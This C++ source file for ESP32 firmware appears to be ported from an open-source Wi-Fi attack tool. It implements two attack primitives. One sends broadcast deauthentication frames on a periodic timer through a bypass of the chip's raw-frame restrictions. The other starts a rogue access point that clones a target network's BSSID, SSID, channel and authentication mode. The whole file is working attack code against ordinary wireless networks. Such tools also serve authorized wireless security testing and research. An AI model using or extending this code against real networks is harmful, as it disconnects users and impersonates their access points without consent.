/**
 * @file attack_method.cpp
 * @brief Common attack primitives — converted to C++
 * @author risinek (risinek@gmail.com) | C++ port: Teuku Maulana (TM26)
 */

#include "attack_method.h"

#include <cstring>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "attack_method";

static esp_timer_handle_t s_deauth_timer = nullptr;

// ── Broadcast deauth ───────────────────────────────────────────────────────

static void timer_send_deauth(void *arg) {
    wsl_bypasser_send_deauth_frame(static_cast<const wifi_ap_record_t *>(arg));
}

extern "C" void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec) {
    ESP_LOGD(TAG, "Starting broadcast deauth timer (period=%us)", period_sec);
    const esp_timer_create_args_t args = {
        .callback = &timer_send_deauth,
        .arg      = const_cast<wifi_ap_record_t *>(ap_record),
        .name     = "deauth_timer"
    };
    ESP_ERROR_CHECK(esp_timer_create(&args, &s_deauth_timer));
    ESP_ERROR_CHECK(esp_timer_start_periodic(s_deauth_timer,
                                             static_cast<uint64_t>(period_sec) * 1'000'000ULL));
}

extern "C" void attack_method_broadcast_stop() {
    ESP_LOGD(TAG, "Stopping broadcast deauth timer");
    ESP_ERROR_CHECK(esp_timer_stop(s_deauth_timer));
    esp_timer_delete(s_deauth_timer);
    s_deauth_timer = nullptr;
}

// ── Rogue AP ──────────────────────────────────────────────────────────────

extern "C" void attack_method_rogueap(const wifi_ap_record_t *ap_record) {
    ESP_LOGD(TAG, "Configuring Rogue AP (cloning BSSID)");
    wifictl_set_ap_mac(ap_record->bssid);

    wifi_config_t cfg = {};
    cfg.ap.ssid_len      = static_cast<uint8_t>(strlen(reinterpret_cast<const char *>(ap_record->ssid)));
    cfg.ap.channel       = ap_record->primary;
    cfg.ap.authmode      = ap_record->authmode;
    cfg.ap.max_connection = 1;
    memcpy(cfg.ap.ssid,     ap_record->ssid, 32);
    memcpy(cfg.ap.password, "dummypassword", 14);

    wifictl_ap_start(&cfg);
}
